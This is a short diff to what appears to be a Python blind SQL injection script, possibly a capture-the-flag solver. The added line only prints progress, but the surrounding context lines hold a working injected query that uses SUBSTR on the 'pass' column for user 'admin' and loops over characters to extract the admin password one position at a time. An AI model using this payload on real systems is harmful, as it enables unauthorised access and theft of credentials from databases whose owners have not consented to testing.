@@ -20,6 +20,7 @@ password = ''
 for index in range(1, pass_len + 1):
     for char_number in range(48, 123):
         char = chr(char_number)
+        print('{}{}'.format(password, char))
         sql = 'admin\' AND SUBSTR((SELECT pass FROM user WHERE id = \'admin\'), {index}, 1) = \'{char}\' --'.format(
             index=index, char=char)
         payload = {
